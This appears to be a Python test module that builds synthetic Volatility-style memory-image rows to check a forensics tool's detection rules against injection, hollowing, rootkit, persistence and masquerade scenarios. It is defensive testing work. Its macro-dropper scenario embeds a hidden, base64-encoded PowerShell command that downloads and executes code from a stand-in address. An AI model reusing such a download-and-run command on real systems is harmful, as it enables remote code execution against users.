"""Synthetic malware-shaped memory images, to check that MemoryGraph's rules fire on the behaviours they are meant to catch, with no memory dump and no internet.

WHAT THIS IS AND IS NOT. Each scenario is a set of Volatility-shaped plugin rows (the same columns Volatility 3 prints) written to look like one kind of attack: an injected
process, a hollowed one, a hidden one, persistence, a macro dropper that phones home, a kernel rootkit, a masquerading service. The rows go through the real pipeline (the Windows
engine: normalizer, timeline, rules) exactly like the rows of a real image. A PASS therefore shows that the *rules* recognise the pattern. It does NOT show that the Volatility plugin
would print such rows for a real sample, and it says nothing about recall on real malware: that needs real images (see tools/realworld/README.md). The expectations below were
written before the scenarios were run; a scenario that is not detected is reported as a gap, not adjusted.
"""
from __future__ import annotations

from collections import defaultdict
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional

from app.models import PluginResult

CAPTURE = "2024-03-01T12:00:00+00:00"
BOOT = "2024-03-01T07:00:00+00:00"
B = chr(92)


def win(*parts: str) -> str:
    return B.join(["C:"] + list(parts))


# --------------------------------------------------------------------------------------------------------------- the builder
class Image:
    """A small Windows 10 x64 memory image made of plugin rows (built up by the scenarios)."""

    def __init__(self):
        self.rows: Dict[str, List[dict]] = defaultdict(list)
        self.pids: List[int] = []
        info = {"Kernel Base": "0xf80123400000", "DTB": "0x1aa000", "Is64Bit": "True", "IsPAE": "False", "layer_name": "0 WindowsIntel32e", "KeNumberProcessors": "4",
                "SystemTime": CAPTURE, "NtSystemRoot": win("WINDOWS"), "NtProductType": "NtProductWinNt", "NtMajorVersion": "10", "NtMinorVersion": "0",
                "NTBuildLab": "17763.1.amd64fre.rs5_release.180914-1434", "Major/Minor": "15.17763", "MachineType": "34404"}
        self.rows["windows.info"] = [{"Variable": k, "Value": v} for k, v in info.items()]
        self._clean_system()

    # ------------------------------------------------------------------ processes
    def process(self, pid: int, ppid: int, name: str, image: str, cmdline: Optional[str] = None, created: str = BOOT, session: int = 1, threads: int = 6,
                visible: bool = True, exited: str = "", libraries: bool = True) -> int:
        row = {"PID": pid, "PPID": ppid, "ImageFileName": name[:15], "CreateTime": created, "ExitTime": exited or None, "Threads": threads, "Handles": None,
               "SessionId": session, "Wow64": False, "Offset(V)": 0xFFFFD00000000000 + pid * 0x1000, "File output": "Disabled"}
        if visible:
            self.rows["windows.pslist"].append(dict(row))
        self.rows["windows.psscan"].append(dict(row))
        self.rows["windows.pstree"].append(dict(row, Path=image, Audit=B + "Device" + B + "HarddiskVolume2" + image[2:], Cmd=cmdline or image))
        self.rows["windows.cmdline"].append({"PID": pid, "Process": name, "Args": cmdline or image})
        self.rows["windows.getsids"].append({"PID": pid, "Process": name, "SID": "S-1-5-18" if session == 0 else "S-1-5-21-1-2-3-1001", "Name": "Local System" if session == 0 else "user"})
        self.pids.append(pid)
        if libraries:
            for dll in ("ntdll.dll", "kernel32.dll", "KERNELBASE.dll"):
                self.dll(pid, name, dll, win("Windows", "System32", dll))
        return pid

    def dll(self, pid: int, process: str, name: str, path: str, loaded: str = BOOT) -> None:
        self.rows["windows.dlllist"].append({"PID": pid, "Process": process, "Base": 0x7FFA00000000 + len(self.rows["windows.dlllist"]) * 0x100000, "Size": 0x100000,
                                             "Name": name, "Path": path, "LoadTime": loaded, "LoadCount": 1, "File output": "Disabled"})

    def malfind(self, pid: int, process: str, start: int, size: int, hexdump: str, protection: str = "PAGE_EXECUTE_READWRITE") -> None:
        self.rows["windows.malfind"].append({"PID": pid, "Process": process, "Start VPN": start, "End VPN": start + size - 1, "Tag": "VadS", "Protection": protection,
                                             "CommitCharge": size // 4096, "PrivateMemory": 1, "Hexdump": hexdump, "Disasm": hexdump, "Notes": None, "File output": "Disabled"})

    def connection(self, pid: int, owner: str, remote: str, port: int, state: str = "ESTABLISHED", local: str = "10.1.1.20", lport: int = 50123) -> None:
        self.rows["windows.netscan"].append({"Proto": "TCPv4", "LocalAddr": local, "LocalPort": lport + len(self.rows["windows.netscan"]), "ForeignAddr": remote, "ForeignPort": port,
                                             "State": state, "PID": pid, "Owner": owner, "Created": "2024-03-01T11:40:00+00:00", "Offset": 0xFFFFD00000100000})

    def handle(self, holder: int, holder_name: str, target: int, access: int = 0x1FFFFF) -> None:
        self.rows["windows.handles"].append({"PID": holder, "Process": holder_name, "Type": "Process", "GrantedAccess": access, "HandleValue": 0x1C4,
                                             "Name": f"Pid {target}", "Details": f"Pid {target}", "Offset": 0xFFFFD00000200000})

    def plugin(self, name: str, rows: List[dict]) -> None:
        self.rows[name] = list(self.rows.get(name, [])) + rows

    # ------------------------------------------------------------------ the quiet system every scenario starts from
    def _clean_system(self) -> None:
        sys32 = lambda n: win("Windows", "System32", n)
        self.process(4, 0, "System", "System", session=0, libraries=False)
        self.process(356, 4, "smss.exe", sys32("smss.exe"), win("Windows", "System32", "smss.exe"), session=0)
        self.process(468, 440, "csrss.exe", sys32("csrss.exe"), win("Windows", "system32", "csrss.exe") + " ObjectDirectory=" + B + "Windows", session=0)
        self.process(552, 440, "wininit.exe", sys32("wininit.exe"), session=0)
        self.process(620, 612, "winlogon.exe", sys32("winlogon.exe"), session=1)
        self.process(692, 552, "services.exe", sys32("services.exe"), session=0)
        self.process(708, 552, "lsass.exe", sys32("lsass.exe"), win("Windows", "system32", "lsass.exe"), session=0)
        self.process(836, 692, "svchost.exe", sys32("svchost.exe"), win("Windows", "system32", "svchost.exe") + " -k DcomLaunch", session=0)
        self.process(912, 692, "svchost.exe", sys32("svchost.exe"), win("Windows", "system32", "svchost.exe") + " -k netsvcs", session=0)
        self.process(3200, 3180, "explorer.exe", win("Windows", "explorer.exe"), win("Windows", "Explorer.EXE"), created="2024-03-01T07:05:00+00:00")

    def results(self) -> List[PluginResult]:
        return [PluginResult(name, "Completed", rows) for name, rows in self.rows.items()]


# --------------------------------------------------------------------------------------------------------------- scenarios
@dataclass
class Expectation:
    description: str
    rule_id: str
    process: Optional[str] = None                 # process image name the finding must be about (None: any, or a kernel finding)
    min_severity: str = "Low"
    absent: bool = False                          # True: the rule must NOT fire (a true negative)


@dataclass
class Scenario:
    id: str
    title: str
    story: str
    build: Callable[[Image], None]
    expect: List[Expectation] = field(default_factory=list)
    max_severity: Optional[str] = None            # a clean image: nothing above this
    chain_pid: Optional[int] = None               # the Injection view must tell a story (a chain) about this process
    chain_kind: str = ""


def s_clean(img: Image) -> None:
    img.process(4100, 3200, "chrome.exe", win("Program Files", "Google", "Chrome", "Application", "chrome.exe"), created="2024-03-01T09:10:00+00:00")
    img.connection(4100, "chrome.exe", "142.250.74.78", 443)
    img.process(4200, 3200, "notepad.exe", sys32_path("notepad.exe"), created="2024-03-01T09:20:00+00:00")


def sys32_path(name: str) -> str:
    return win("Windows", "System32", name)


def s_injection(img: Image) -> None:
    img.process(5100, 3200, "evil.exe", win("Users", "Public", "evil.exe"), created="2024-03-01T11:30:00+00:00")
    img.process(5200, 3200, "notepad.exe", sys32_path("notepad.exe"), created="2024-03-01T11:20:00+00:00")
    img.malfind(5200, "notepad.exe", 0x1E0000, 0x10000, "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00")             # an MZ header in private executable memory
    img.plugin("windows.malware.suspicious_threads", [{"PID": 5200, "Process": "notepad.exe", "TID": 7788, "Context": "Win32Start", "Address": 0x1E1000,
                                                       "Note": "This thread started execution in the VAD starting at base address 0x1e0000", "VAD Path": "<Non-File Backed Region>"}])
    img.handle(5100, "evil.exe", 5200)                                                                                # evil.exe holds a full-access handle to notepad.exe


def s_hollowing(img: Image) -> None:
    img.process(5300, 692, "svchost.exe", sys32_path("svchost.exe"), win("Windows", "system32", "svchost.exe") + " -k netsvcs", created="2024-03-01T11:25:00+00:00", session=0)
    img.plugin("windows.malware.hollowprocesses", [{"PID": 5300, "Process": "svchost.exe", "Notes": "Process memory is different from the file on disk"}])
    img.plugin("windows.malware.pebmasquerade", [{"PID": 5300, "EPROCESS_ImageFileName": "svchost.exe", "EPROCESS_SeAudit_ImageFileName": B + "Device" + B + "HarddiskVolume2" + B + "Windows" + B + "System32" + B + "svchost.exe",
                                                  "PEB_ImageFilePath": win("Users", "Public", "payload.exe"), "PEB_ImageFilePath_Spoofed": True, "PEB_CommandLine_Spoofed": False}])


def s_hidden(img: Image) -> None:
    img.process(5400, 692, "hidden.exe", sys32_path("hidden.exe"), created="2024-03-01T08:15:00+00:00", visible=False, threads=3)
    img.plugin("windows.psxview", [{"PID": 5400, "Name": "hidden.exe", "Offset(Virtual)": 0xFFFFD00000000000 + 5400 * 0x1000, "pslist": False, "psscan": True, "thrdscan": True,
                                    "csrss": True, "Exit Time": ""}])


def s_persistence(img: Image) -> None:
    run = "Microsoft" + B + "Windows" + B + "CurrentVersion" + B + "Run"
    key = B + "Device" + B + "HarddiskVolume2" + B + "Windows" + B + "System32" + B + "config" + B + "software" + B + run
    img.plugin("windows.registry.printkey [Run, machine]", [{"Key": key, "Name": "Updater", "Type": "REG_SZ", "Data": win("Users", "Public", "updater.exe"), "Last Write Time": "2024-03-01T10:00:00+00:00", "Volatile": False}])
    img.plugin("windows.svcscan", [{"Name": "UpdSvc", "Display": "Update Service", "Binary": win("Users", "Public", "Temp", "svc.exe"), "Start": "SERVICE_AUTO_START",
                                    "State": "SERVICE_RUNNING", "Type": "SERVICE_WIN32_OWN_PROCESS", "PID": 5500, "Offset": 0xFFFFD00000300000}])
    img.plugin("windows.registry.userassist", [{"Name": win("Users", "Public", "invoice.exe"), "Count": 1, "Last Updated": "2024-03-01T09:55:00+00:00", "Path": "ntuser.dat" + B + "UserAssist"}])


def s_macro_dropper(img: Image) -> None:
    img.process(5600, 3200, "WINWORD.EXE", win("Program Files", "Microsoft Office", "root", "Office16", "WINWORD.EXE"), created="2024-03-01T11:00:00+00:00")
    img.process(5610, 5600, "cmd.exe", sys32_path("cmd.exe"), "cmd.exe /c powershell.exe -NoP -W Hidden -EncodedCommand " + "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcALwBhACcAKQA=", created="2024-03-01T11:01:00+00:00")
    img.process(5620, 5610, "powershell.exe", win("Windows", "System32", "WindowsPowerShell", "v1.0", "powershell.exe"),
                "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcALwBhACcAKQA=",
                created="2024-03-01T11:01:30+00:00")
    img.connection(5620, "powershell.exe", "45.77.65.211", 443)


def s_kernel_rootkit(img: Image) -> None:
    img.plugin("windows.modules", [{"Base": 0xF80123400000, "Size": 0xA00000, "Name": "ntoskrnl.exe", "Path": win("Windows", "system32", "ntoskrnl.exe"), "Offset": 0xFFFFD00000400000},
                                   {"Base": 0xF80124000000, "Size": 0x50000, "Name": "tcpip.sys", "Path": win("Windows", "System32", "drivers", "tcpip.sys"), "Offset": 0xFFFFD00000400100}])
    img.plugin("windows.modscan", [{"Base": 0xF80123400000, "Size": 0xA00000, "Name": "ntoskrnl.exe", "Path": win("Windows", "system32", "ntoskrnl.exe"), "Offset": 1},
                                   {"Base": 0xF80124000000, "Size": 0x50000, "Name": "tcpip.sys", "Path": win("Windows", "System32", "drivers", "tcpip.sys"), "Offset": 2},
                                   {"Base": 0xF80125000000, "Size": 0x20000, "Name": "evilrk.sys", "Path": win("Windows", "System32", "drivers", "evilrk.sys"), "Offset": 3}])
    img.plugin("windows.ssdt", [{"Index": 0x42, "Address": 0xF80125001000, "Module": "evilrk", "Symbol": "-"}, {"Index": 0x43, "Address": 0xF80123500000, "Module": "ntoskrnl", "Symbol": "NtOpenProcess"}])
    img.plugin("windows.callbacks", [{"Type": "PspCreateProcessNotifyRoutine", "Callback": 0xF80125002000, "Module": None, "Symbol": None, "Detail": None}])
    img.plugin("windows.driverscan", [{"Driver Name": "evilrk", "Name": B + "Driver" + B + "evilrk", "Offset": "0xd00000500000", "Service Key": "evilrk", "Size": "0x20000", "Start": "0xf80125000000"}])
    img.plugin("windows.driverirp", [{"Driver Name": "evilrk", "IRP": "IRP_MJ_CREATE", "Address": 0xF80126000000, "Module": None, "Offset": 0xD00000500000, "Symbol": None}])


def s_masquerade(img: Image) -> None:
    img.process(5700, 3200, "svchost.exe", win("Users", "Public", "svchost.exe"), win("Users", "Public", "svchost.exe"), created="2024-03-01T10:30:00+00:00")
    img.process(5710, 3200, "lsass.exe", win("Windows", "Temp", "lsass.exe"), win("Windows", "Temp", "lsass.exe"), created="2024-03-01T10:31:00+00:00")
    img.process(5720, 3200, "scvhost.exe", win("Users", "Public", "scvhost.exe"), win("Users", "Public", "scvhost.exe"), created="2024-03-01T10:32:00+00:00")


def s_portable_tool(img: Image) -> None:
    img.process(5800, 3200, "update_tool.exe", win("Users", "bob", "Desktop", "update_tool.exe"), win("Users", "bob", "Desktop", "update_tool.exe"), created="2024-03-01T11:10:00+00:00")
    img.connection(5800, "update_tool.exe", "185.220.101.4", 8443)


def s_benign_lookalikes(img: Image) -> None:
    """Things that looked like malware on real images and were not (the false positives found by running MemoryGraph on a real Windows 10 and a real Windows XP image)."""
    # a .NET host: an executable region that holds data, and the runtime only in the memory map (its dlllist is empty)
    img.process(6100, 692, "taskhostw.exe", sys32_path("taskhostw.exe"), created="2024-03-01T09:30:00+00:00", libraries=False)
    img.malfind(6100, "taskhostw.exe", 0x7FF66CD00000, 0xA0000, "d8 ff ff ff ff ff ff ff 08 00 00 00 00 00 00 00")
    img.plugin("windows.ldrmodules", [{"Pid": 6100, "Process": "taskhostw.exe", "Base": 0x7FF900000000, "InLoad": False, "InInit": False, "InMem": False,
                                       "MappedPath": B + "Windows" + B + "System32" + B + "mscoreei.dll"}])
    # shortcuts that installers put on the Public Desktop, recorded by UserAssist when double-clicked
    img.plugin("windows.registry.userassist", [{"Name": win("Users", "Public", "Desktop", "Google Chrome.lnk"), "Count": 4, "Last Updated": "2024-03-01T09:40:00+00:00", "Path": "ntuser.dat" + B + "UserAssist"}])
    # a driver that was unloaded: its object is still in memory, its name is unreadable, modscan still lists the image, its handlers are inside that image
    img.plugin("windows.modules", [{"Base": 0xF80123400000, "Size": 0xA00000, "Name": "ntoskrnl.exe", "Path": win("Windows", "system32", "ntoskrnl.exe"), "Offset": 1}])
    img.plugin("windows.modscan", [{"Base": 0xF802214B0000, "Size": 0x25000, "Name": "USBSTOR.SYS", "Path": win("Windows", "System32", "drivers", "USBSTOR.SYS"), "Offset": 2}])
    img.plugin("windows.driverscan", [{"Driver Name": chr(0xD7C0) + chr(0x3B93) + chr(0xFFFD) + chr(0x0518), "Name": B + "Driver" + B + "USBSTOR", "Offset": "0xd98df95e62e0", "Service Key": "USBSTOR",
                                       "Size": "0x25000", "Start": "0xf802214b0000"}])
    img.plugin("windows.driverirp", [{"Driver Name": chr(0xD7C0) + chr(0x3B93) + chr(0xFFFD) + chr(0x0518), "IRP": "IRP_MJ_CREATE", "Address": 0xF802214CF320, "Module": None,
                                      "Offset": 0xD98DF95E62E0, "Symbol": None}])
    # a process created 40 seconds after the acquisition started: in the pool scan, not yet in the active list
    img.process(6200, 692, "svchost.exe", sys32_path("svchost.exe"), created="2024-03-01T12:00:40+00:00", visible=False, threads=3)
    # a kernel callback value that is not the address of any code (no executable memory holds it)
    img.plugin("windows.callbacks", [{"Type": "IoRegisterFsRegistrationChange", "Callback": 0x1375C085, "Module": None, "Symbol": None, "Detail": None}])
    img.plugin("windows.vadinfo", [{"PID": 6100, "Process": "taskhostw.exe", "Start VPN": 0x7FF66CD00000, "End VPN": 0x7FF66CD9FFFF, "Protection": "PAGE_EXECUTE_READWRITE", "File": None, "PrivateMemory": 1}])


SCENARIOS: List[Scenario] = [
    Scenario("S0-clean", "Clean workstation (control)", "A quiet system: Chrome with a normal HTTPS connection and Notepad.", s_clean, max_severity="Low"),
    Scenario("S9-benign-lookalikes", "Benign look-alikes (control)", "Five things that looked like attacks on real images and were not: nothing may rise above Low.", s_benign_lookalikes, max_severity="Low"),
    Scenario("S1-injection", "Process injection", "evil.exe from the Public folder writes a PE into notepad.exe and starts a thread there.", s_injection, [
        Expectation("PE image injected into notepad.exe's memory", "MEM-001", "notepad.exe", "High"),
        Expectation("thread started in memory no module backs", "MAL-002", "notepad.exe", "Medium"),
        Expectation("the injector runs from a user-writable folder", "PR-003", "evil.exe", "Medium")], chain_pid=5200, chain_kind="handle"),
    Scenario("S2-hollowing", "Process hollowing", "svchost.exe whose memory is not the file on disk and whose PEB names another image.", s_hollowing, [
        Expectation("hollowed process, confirmed by a second plugin", "MAL-001", "svchost.exe", "High"),
        Expectation("PEB image path differs from the kernel's record", "MAL-003", "svchost.exe", "Medium")]),
    Scenario("S3-hidden", "Hidden (unlinked) process", "A process that psscan, the thread scan and csrss see but pslist does not, started hours before the capture.", s_hidden, [
        Expectation("process unlinked while alive", "PT-003", "hidden.exe", "Medium")]),
    Scenario("S4-persistence", "Persistence", "A Run key and a service that start programs from the Public folder, and a UserAssist entry for the dropper.", s_persistence, [
        Expectation("Run key starts code from a risky folder", "PER-001", None, "Medium"),
        Expectation("service binary in a user-writable folder", "SVC-001", None, "Medium"),
        Expectation("program started from the Public folder (UserAssist)", "UA-001", None, "Medium")]),
    Scenario("S5-macro-dropper", "Office macro dropper with command and control", "WINWORD.EXE starts cmd.exe, which starts an encoded PowerShell that connects to a public address.", s_macro_dropper, [
        Expectation("interpreter started by an Office process", "PT-004", "cmd.exe", "Low"),
        Expectation("encoded PowerShell", "CL-001", "powershell.exe", "Medium"),
        Expectation("external network activity from a suspicious process", "NET-001", "powershell.exe", "Medium"),
        Expectation("several kinds of evidence on one process", "CORR-001", "powershell.exe", "Medium")]),
    Scenario("S6-kernel-rootkit", "Kernel rootkit", "A driver that is not in the module list but hooks a system call, registers a callback and redirects an IRP handler.", s_kernel_rootkit, [
        Expectation("system call table entry in a non-kernel module", "SSDT-001", None, "Medium"),
        Expectation("driver found by scan, missing from the module list", "DRV-001", None, "Low"),
        Expectation("kernel callback outside every module", "CBK-001", None, "Medium"),
        Expectation("IRP handler outside the driver's own image", "MAL-006", None, "Medium")]),
    Scenario("S7-masquerade", "Masquerading system processes", "svchost.exe and lsass.exe running from user-writable folders, and a look-alike name.", s_masquerade, [
        Expectation("core process from an unexpected path (svchost)", "PR-002", "svchost.exe", "Medium"),
        Expectation("duplicate of a single-instance process (lsass)", "PT-002", "lsass.exe", "Low"),
        Expectation("name that imitates a Windows component", "PR-001", "scvhost.exe", "Low"),
        Expectation("running from a user-writable folder", "PR-003", "svchost.exe", "Medium")]),
    Scenario("S8-portable-tool", "Portable tool that phones home", "A program run from the Desktop (not installed) with a connection to a public address on an unusual port.", s_portable_tool, [
        Expectation("program running from the user's own folders, with a public connection", "BEH-001", "update_tool.exe", "Medium")]),
]


# --------------------------------------------------------------------------------------------------------------- running them
SEVERITY = {"": 0, "Info": 0, "Low": 1, "Medium": 2, "High": 3}


def run_scenario(scenario: Scenario) -> dict:
    """Run one scenario through the real Windows engine; returns what was found and how each expectation did."""
    from app.analysis.pipeline import analyze_plugins
    img = Image()
    scenario.build(img)
    result = analyze_plugins("synthetic-" + scenario.id + ".raw", img.results(), engine="windows")
    visible = [f for f in result.indications if f.triage not in ("false_positive", "baseline")]
    outcomes = []
    for exp in scenario.expect:
        hits = [f for f in visible if f.rule_id == exp.rule_id and (exp.process is None or f.process_name.lower() == exp.process.lower()) and SEVERITY.get(f.severity, 0) >= SEVERITY[exp.min_severity]]
        outcomes.append({"description": exp.description, "rule_id": exp.rule_id, "process": exp.process or "", "min_severity": exp.min_severity,
                         "status": "PASS" if (hits and not exp.absent) or (not hits and exp.absent) else "FAIL",
                         "detail": (f"{hits[0].severity}: {hits[0].title}" if hits else "not reported"
                                    + (f" (the rule reported {sorted({f.severity for f in visible if f.rule_id == exp.rule_id})} on other subjects)" if any(f.rule_id == exp.rule_id for f in visible) else ""))})
    if scenario.max_severity is not None:
        worst = max((SEVERITY.get(f.severity, 0) for f in visible), default=0)
        outcomes.append({"description": f"nothing above {scenario.max_severity} on a clean system", "rule_id": "-", "process": "", "min_severity": scenario.max_severity,
                         "status": "PASS" if worst <= SEVERITY[scenario.max_severity] else "FAIL",
                         "detail": "findings: " + (", ".join(f"{f.rule_id} {f.severity}" for f in visible) or "none")})
    if scenario.chain_pid:
        from app.engines.windows.analysis import injection
        chains = {c.pid: c for c in injection.build_chains(result)}
        chain = chains.get(scenario.chain_pid)
        ok = chain is not None and any(s.kind == scenario.chain_kind for s in chain.steps)
        outcomes.append({"description": f"the injection view tells a story about PID {scenario.chain_pid} including a '{scenario.chain_kind}' step", "rule_id": "chain", "process": "",
                         "min_severity": "", "status": "PASS" if ok else "FAIL", "detail": (", ".join(f"{s.phase}: {s.kind}" for s in chain.steps[:5]) if chain else "no chain")})
    return {"id": scenario.id, "title": scenario.title, "story": scenario.story, "outcomes": outcomes, "findings": [
        {"rule_id": f.rule_id, "severity": f.severity, "process": f.process_name, "title": f.title} for f in visible]}


def run_all() -> List[dict]:
    return [run_scenario(s) for s in SCENARIOS]
